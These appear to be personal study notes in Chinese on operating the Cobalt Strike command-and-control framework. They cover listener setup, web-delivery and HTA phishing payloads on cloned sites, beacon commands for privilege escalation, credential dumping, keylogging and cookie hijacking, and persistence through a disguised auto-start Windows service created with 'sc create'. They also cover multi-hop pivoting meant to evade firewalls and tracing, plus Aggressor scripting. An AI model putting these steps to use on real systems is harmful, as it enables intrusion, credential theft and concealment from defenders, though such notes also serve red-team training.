加执行权限（刚开始没执行权限）./teamserver ip(互联网上的ip）密码：123456（自己造）./cobalstriketeamserver   cobalstrike--启动器                   (多平台使用）启动HOST:外网ipconnectcs功能介绍菜单栏--所有功能目标列表控制台--输入和输出区新建listeneradd--name--Beacon默认http--host（自己）--proxy（可选）可调控颜色配置攻击载荷attack--web driveby（网站木马）--Script Web Delivery--listen--type--x64(可选攻击系统）（得到在用户上执行的命令）----上线extenral 外网ipinternal  内网ip右击--interract--默认回连时间60s--shell ipconfig--newconnect--打开新建连接   perference--首选项，优化页面visualzation--执行结果展示VPN--设置vpn接口listeners--监听器Script Manager--脚本使用view：application  显示应用信息credentials  获取密码download 下载文件packages---攻击方式 ????windows excutewindows excute（s)内网攻击使用代理signed applet attack 钓鱼 spear fish  钓鱼邮件 右击--session--sleep（更改时间）生成exe木马---权限提升---make token（伪造用户，进行域控）net view---看到内网主机共享socks server--建立代理（作为跳板）常用命令：help getuid(举例）--查看命令功能getuid--获取当前用户权限getsystem--获取system权限（TrustInstall最高安装权限）Brosoer Pivot（劫持cookie）Desktop VNC（远程桌面模式）Port Scan（端口扫描）--测试内网主机、端口开放process list（输出进程树）--进程控制--键盘记录--inject（将攻击载荷注入到进程中，长时间控制）net系列net logons--当前登录用户net domain_trusts---查看域信任net share--默认共享net view 发现共享域net computers---net dclist(查找域控）execute后台执行execute notepadpowerpick 不通过powershell执行命令powershell-import  ./xxx.ps1（将powershell脚本加载到内存中，并使用powershell执行）aggresor脚本---去github上找大佬写的.cna脚本.cna=Aggressor Script----二次开发Sleep语言1、简述$=定义变量@=定义数组%=定义字典sub fun()=构造函数command w{}=构造快捷命令$a=参数bind=绑定键盘快捷键popup=修改cs菜单解释器中e $a="haha" (编辑命令）x $a （输出命令）2、脚本加载load /root/t2.cna(加载脚本）命令行执行java -jar sleep.jarhelp （查看可用命令）创建数据交互函数脚本1、view--Script Consoleload /root/ad1.cnareload---查找ls下的文件---重复加载不需要写绝对路径快捷命令脚本command w{println("you click w");}绑定快捷键bind Ctrl+0{show_message("this is a alert");elog("i am log");}搭建菜单(默认上端菜单栏）popup caidan1{item("&item1",{url_open("http://www.baidu.com")});separator()---菜单分隔符item("&item2",{url_open("http://www.bilibili.com")});}menubar("my caidan","candan1");popup beacon_bottom{    menu "attack"{item("&item1",{url_open("http://www.baidu.com")});separator()---菜单分隔符item("&item2",{url_open("http://www.bilibili.com")});}}tron---开启函数跟踪---知道函数执行到哪一步c2客户端--直接影响cs的客户端c2数据模型target()---显示连接信息---x target()[0]listener---显示listen----x listener简写命令command showme{println("ip address is：".target()[$1]["address"]."\n os is:".target()[$1]["os"]);}clonesite虚假内容诱导渗透1.cs--attack--packages--HTML Application--excu(powershell)生成evil.hta2、view--host file--选择evil.hta--local选择同名文件克隆网站诱导渗透1、cs--attack--web drive--clone sitehttp://www.baidu.comlocal--/baiduattack--evil.hta服务权限维持windows--注册表、启动项、计划任务、服务、快捷键功能等1、cs--attack--windows excute--windows server exe将权限维持木马写到c:\windows\temp中，并上传到服务中2、shell sc create "thisserver" binpath="c:\windows\temp\b.exe关联服务并进行伪装shell sc description "thisserver" "zhe shi fu wu"服务自启动shell sc config "thisserver" start=autoshell net start "thisserver"多层正向连接或反向连接hack（192.168.1.186）----（192.168.1.231）ser1（172.16.214.140）-----（172.16.214.141）ser2多层正向连接1、设置监听器listener--add---beacon tcp2、生成windows excutes（s可以使用tcp）---windows server exe3、使用中间人进行连接connect 172.16.214.141多层反向连接（更好的规避防火墙的查杀）---多数使用1、使用ser1当作中间人ser1--右键选中Pivoting--listener(端口转发）2、生成windows excutes（s可以使用tcp）---windows server exe（逆向追踪只能追踪到中间人ip）
